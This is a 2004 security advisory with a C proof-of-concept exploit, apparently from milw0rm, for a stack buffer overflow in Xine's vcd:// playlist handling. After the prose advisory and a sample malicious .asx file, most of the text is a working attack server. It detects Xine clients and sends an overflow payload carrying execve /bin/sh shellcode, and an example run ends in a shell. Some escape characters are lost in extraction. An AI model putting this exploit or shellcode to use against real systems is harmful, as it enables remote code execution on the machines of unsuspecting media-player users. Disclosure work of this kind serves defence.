/* 

***************************************************************************************************************** 
  $ An open security advisory #6 - Xine vcd MRL input identifier 
management overflow 

***************************************************************************************************************** 
  1: Bug Researcher: c0ntex[at]open-security.org 
  2: Bug Released: July 28th 2004 
  3: Bug Impact Rate: Medium / Hi 
  4: Bug Scope Rate: Remote / Local 

***************************************************************************************************************** 
  $ This advisory and/or proof of concept code must not be used for 
commercial gain. 

***************************************************************************************************************** 

    Xine - A free video player 
    http://xinehq.de 

    "xine is a free multimedia player. It plays back CDs, DVDs, and 
VCDs. It also decodes multimedia files like AVI, MOV, WMV, and MP3 from 
    local disk drives, and displays multimedia streamed over the 
Internet. It interprets many of the most common multimedia formats available 
    - and some of the most uncommon formats, too." 

    Part 2 in the Media Mayhem saga, a name that was decided as being 
aptly fitting for the "Media Player" security audit project that the Open 
    Security Group website started at the end of May. This project 
continues finding remote exploits in popular media players for Windows and 
    Linux / UNIX derived systems. 

    Like the excellent Mplayer, Xine is a superb free media player for 
Linux. Sadly there is a generic stack based buffer overflow in all versions 
    of Xine-lib, including Xine-lib-rc5 that allows for local and remote 
malicious code execution. 

    By overflowing the vcd:// input source identifier buffer, it is 
possible to modify the instruction pointer with a value that a malicious 
attacker 
    can control. The issue can be replicated in a remote context by 
embedding the input source idientifier within a playlist file, such as 
an asx. 
    When a user plays the file, this stack overflow will occur, exploit 
code can then be executed with the rights of the user running Xine. 

    The problem slightly increases due to a usability feature. It does 
not have to be an asx extension for exploitation to succeed as Xine will try 
    to be clever and play any media type found, providing it's valid. 
This still means the attack vector MUST include the .asx input 
identifier but 
    it means you can not even trust URL's for .mp3, .mpeg, .mpg or .avi 
media. As long as Xine finds a valid media header, it's happy to change 
    the demuxer reference and play the found media. In this case it's a 
playlist file, ".asx",   though others should work. 

    Any of the following demuxors will work when running against the 
attached POC server: 

            xine --no-splash http://sunscreen/opensecurity.asx 
  xine --no-splash http://sunscreen/opensecurity.mp3 
  xine --no-splash http://sunscreen/opensecurity.mpg 
  xine --no-splash http://sunscreen/opensecurity.mpeg 
  xine --no-splash http://sunscreen/opensecurity.wma 
  xine --no-splash http://sunscreen/opensecurity.avi 
            xine --no-splash http://sunscreen/blah.blah 
            xine --no-splash http://sunscreen/ 

    There are some tricks that may have to be pulled to allow for 
successful code execution to work, primarily due to some memory corruption 
    that happens and opcode destruction. However it is easily defeated 
by either jmp'ing over the corrupt few bytes or by placing the shellcode 
    into the buffer at some known good location. 

    An example malicious .asx file: 

    sunscreen$ cat open-security.asx 
    <asx version = "3.0"> 
    <title>Open Security Media Archive</title> 
    <author>Brought to you by c0ntex[at]open-security.org</author> 
        <abstract> 
          SongList: 
          Track 1 - Open Security Rock(s) -> SOAD   - Chop Suey 
          Track 2 - Open Security Rock(s) -> Media Mayhem Militia 
        </abstract> 
                <entry> 
                <title>System Of A Down - Chop Suey</title> 
                <author>c0ntex[at]open-security.org</author> 
                <copyright>?004</copyright> 
                <Ref href = "http://sunscreen/SOAD-ChopSuey.mp3"/> 
                </entry> 
                <entry> 
                <title>All your media are belong to us!</title> 
                <author>c0ntex[at]open-security.org</author> 
                <copyright>?004</copyright> 
                <Ref href = "vcd:// 










????> "/> 
                </entry> 
    </asx> 
    sunscreen$ 

    --- 

    Example POC run: 

    sunscreen$ gcc -o xinesmine xinesmine.c -lsocket -lnsl 
    sunscreen$ ./xinesmine -a 0 -p 80 

      **   Xines_Mine - Remote proof of concept example   ** 

    [-] Uses .asx header reference to make Xine think it has valid 
    [-] reference file, then a crafted package is sent to overflow 
    [-] the vulnerable client && prove remote exploit concept. 
    [-] c0ntex[at]open-security.org {} http://www.open-security.org 

    -> Listening for a connection on port 80 


    [c0ntex@exploited xine]$ ./xine --no-splash 
http://sunscreen/opensecurity.asx 
    This is xine (X11 gui) - a free video player v0.99.2. 
    (c) 2000-2004 The xine Team. 
    Playlist file (http://sunscreen/opensecurity.asx) is invalid. 
    WARN: could not retrieve file info for `image.nrg': No such file or 
directory 
    WARN: init failed 
    WARN: open( 




1?Ph//shh/bin??PS??1?: 
    File name too long 
    WARN: could not retrieve file info for ` 





1?Ph//shh/bin??PS??1?: 
    File name too long 
    WARN: init failed 
    bash-2.05$ 


    Due to the many vulnerabilities being discovered in media players it 
is advised not to play any form of music without first verifying its 
    integrity. It would be worth noting that P2P networks that are 
currently sharing music, videos and films tend to be illegal media and as 
    such void any integrity anyway, I advise highly to stay clear from 
IRC and P2P warez. 

    --- 

    CVS log which details the bug perfectly can be found here: 

-> 
http://sourceforge.net/mailarchive/forum.php?thread_id=5143955&forum_id=11923 


    Get the latest CVS of Xine-lib from here: 

-> http://xinehq.de/index.php/releases 


    Get the Xine (XSA) advisory from here: 

-> http://xinehq.de/index.php/security 


    Get this original advisory from here: 

-> http://www.open-security.org/advisories/advisories.html 

  --- 

  Xine bug discovered 22nd May 2004 
  Xine bug research completed 24th May 2004 
  Xine developers contacted 11th July 2004 
  Xine bug public release 8th August 2004 


  cheers 
  c0ntex[at]open-security.org 
  http://www.open-security.org 

  */ 



#include <errno.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <unistd.h> 
#include <arpa/inet.h> 
#include <netinet/in.h> 
#include <sys/types.h> 
#include <sys/socket.h> 

#ifdef linux 
  #include <getopt.h> 
#endif 


#define SUCCESS0 
#define FAILURE1 

#define BUFFER1044 
#define CDATA150 
#define JMP200 

#define THREAT"xine/1-rc5" 
#define XPLOIT_OS Redhat9 


#define example(OhNoo)   fprintf(stderr, "Usage: ./xines_mine -a 
<align_val> -p <port>nn", OhNoo); 


void die(char * errtrap); 
void banner(void); 
int prepsock(int align_stack, int port); 
int pkg_send(int clisock_fd, int align_stack, char * pload, char * payload); 
int main(int argc, char ** argv); 


static char * http[] = { 
        "HTTP/1.0 200 OKrn", 
        "Date: Thu, 23 May 2004 12:52:15 GMTrn", 
        "Server: Xines_Mine Server(Linux)rn", 
        "MIME-version: 1.0rn", 
        "Content-Type: audio/x-mpegurlrn", 
        "Content-Length: 2000rn", 
        "Connection: closern", 
        "rn" 
}; 


static char * vcdmuxor[] = { 
        "<ASX version = "3.0">rn", 
        "<TITLE>Xines_Mine</TITLE>rn", 
        "<AUTHOR> c0ntex[at]open-security.org 
www.open-security.org</AUTHOR>rn", 
        "<ENTRY>rn", 
        "<ref href="vcd://", 
        ""/>rn", 
        "</ENTRY>rn", 
        "</ASX>rn", 
        "rn" 
}; 


static char opcode[] = 
"x31xc0x31xdbx50x68x2fx2fx73x68x68x2fx62" 

"x69x6ex89xe3x50x53x89xe1x31xd2xb0x0bxcd" 
                                  "x80x31xc0x31xdbxfexc0xcdx80"; 


void 
die(char * errtrap) 
{ 
perror(errtrap); 
_exit(FAILURE); 
//exit(1); 
} 


void 
banner(void) 
{ 
fprintf(stderr, "n   **   Xines_Mine - Remote proof of concept example 
  **nn"); 
fprintf(stderr, "[-] Uses .asx header reference to make Xine think it 
has validn"); 
fprintf(stderr, "[-] reference file, then a crafted package is sent to 
overflown"); 
fprintf(stderr, "[-] the vulnerable client && prove remote exploit 
concept.n"); 
fprintf(stderr, "[-] c0ntex[at]open-security.org {} 
http://www.open-security.org   nn"); 
} 


int 
prepsock(int align_stack, int port) 
{ 
      unsigned int cl_buf, recv_chk, reuse = 1; 
      unsigned int clisock_fd; 

      signed int sock_fd; 

      static char chk_vuln[CDATA]; 
      static char payload[BUFFER]; 

      struct sockaddr_in victimised, xine; 

      char *pload = (char *) &opcode; 


      ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
      ? die("Could not create socket") 
      : (setsockopt(sock_fd,SOL_SOCKET,SO_REUSEADDR, &reuse, 
sizeof(int)) == -1) 
            ? die("Could not re-use socket") 
: memset(&xine, 0, sizeof(xine)); 

      xine.sin_family = AF_INET; 
      xine.sin_port = htons(port); 
      xine.sin_addr.s_addr = htonl(INADDR_ANY); 

      if(bind(sock_fd, (struct sockaddr *)&xine, sizeof(struct 
sockaddr)) == -1) { 
      close(sock_fd); die("Could not bind socket"); 
      } 

      if(listen(sock_fd, 0) == -1) { 
              close(sock_fd); die("Could not listen on socket"); 
      } 


      printf(" -> Listening for a connection on port %dn", port); 


      cl_buf = sizeof(victimised); 
      clisock_fd = accept(sock_fd, (struct sockaddr *)&victimised, 
&cl_buf); 

      if(!clisock_fd) { 
die("Could not accept connectionn"); 
      } 

      if(!close(sock_fd)) { 
fprintf(stderr, "Could not close socketn"); 
      } 


      fprintf(stderr, " -> Action: Attaching from host [%s]n", 
inet_ntoa(victimised.sin_addr)); 
      fprintf(stderr, " -> Using align [%d] and port [%d]n", 
align_stack, port); 


      //memset(chk_vuln, 0, CDATA); 
      memset(chk_vuln, 0, sizeof(chk_vuln)); 

      recv_chk = recv(clisock_fd, chk_vuln, sizeof(chk_vuln), 0); 
      chk_vuln[recv_chk+1] = ''; 

      if((recv_chk == -1) || (recv_chk == 0)) { 
              fprintf(stderr, "Could not receive data from clientn"); 
      } 

      if(strstr(chk_vuln, THREAT)) { 
              fprintf(stderr, " -> Detected vulnerable Xine versionn"); 
      }else{ 
              fprintf(stderr, " -> Detected a non-Xine connection, 
end.n"); 
  close(clisock_fd); die("Ending connection, not a Xine clientn"); 
      } 

      if(pkg_send(clisock_fd, align_stack, pload, payload) == 1) { 
              fprintf(stderr, "Could not send packagen"); 
              close(clisock_fd); die("Could not send package!n"); 
      } 

      if(close(clisock_fd) != 0) { 
fprintf(stderr, "Could not close socketn"); 
} 

      return clisock_fd; 
      //return SUCCESS; 
} 


int 
pkg_send(int clisock_fd, int align_stack, char * pload, char * payload) 
{ 
unsigned int i = 0; 

        memset(payload, 0, BUFFER); 

        for(i = (BUFFER - JMP + align_stack); i < BUFFER; i += 4) { 
                payload = 0xbc; 
                payload[i+1] = 0xe7; 
                payload[i+2] = 0x7f; 
                payload[i+3] = 0xbf; 
        } 

        for (i = 0; i < (BUFFER - 33 - 20); i += 2) {//7 ) { 
                payload = 0x4d; 
payload[i+1] = 0x45; 
                //payload[i+1] = 0x63; 
                //payload[i+1] = 0x30; 
                //payload[i+1] = 0x6e; 
                //payload[i+1] = 0x74; 
                //payload[i+1] = 0x65; 
                //payload[i+1] = 0x78; 
                //payload[i+1] = 0x90; 
} 

        memcpy(payload + i, pload, strlen(pload)); 

        payload[1045] = 0x00; 


        fprintf(stderr, " -> Payload size to send is [%4d]n", 
strlen(payload)); 
        fprintf(stderr, " -> Sending evil payload to our clientn"); 
fflush(stderr); 


        for (i = 0; i < 8; i++) 
                if(send(clisock_fd, http, strlen(http), 0) == -1) { 
                        close(clisock_fd); die("Could not send HTTP 
header"); 
                }fprintf(stderr, "t- Sending valid HTTP header..n"); 
sleep(1); 

        for (i = 0; i < 5; i++) 
                if(send(clisock_fd, vcdmuxor, strlen(vcdmuxor), 
0) == -1) { 
                        close(clisock_fd); die("Could not send asx 
header"); 
                }fprintf(stderr, "t- Sending starter asx header..n"); 
sleep(1); 

        if(send(clisock_fd, payload, strlen(payload), 0) == -1) { 
                close(clisock_fd); die("Could not send payload"); 
        }fprintf(stderr, "t- Sending payload package..n"); sleep(1); 

        for (i = 5; i < 9; i++) 
                if(send(clisock_fd, vcdmuxor, strlen(vcdmuxor), 
0) == -1) { 
                        close(clisock_fd); die("Could not send asx 
header"); 
                }fprintf(stderr, "t- Sending cleanup asx header..n"); 

        return EXIT_SUCCESS; 
} 


int 
main(int argc, char ** argv) 
{ 
        unsigned int align_stack = 0, port = 80; 
        unsigned int opts; 

static char * exploit = NULL; 

        if(argc < 2) { 
                goto jumpout; 
        }banner(); 


        while((opts = getopt(argc, argv, "a:p:")) != -1) { 
                switch(opts) 
                        { 
                        case 'a': 
                                align_stack = atoi(optarg); 
if((align_stack < 0) || (align_stack > 3)) { 
goto jumpout; 
} 
break; 
case 'p': 
port = atoi(optarg); 
if((port < 0) || (port > 65535)) { 
goto jumpout; 
} 
break; 
                        default: 
goto jumpout; 
break; 
                        } 
        } 

        if(prepsock(align_stack, port) == -1) { 
                fprintf(stderr, "Errorn"); 
                _exit(FAILURE); 
        } fprintf(stderr, " -> Test completenn"); 

        return EXIT_SUCCESS; 

jumpout: 
banner(); 
example(exploit); 
return EXIT_FAILURE; 
} 

// milw0rm.com [2004-08-09]
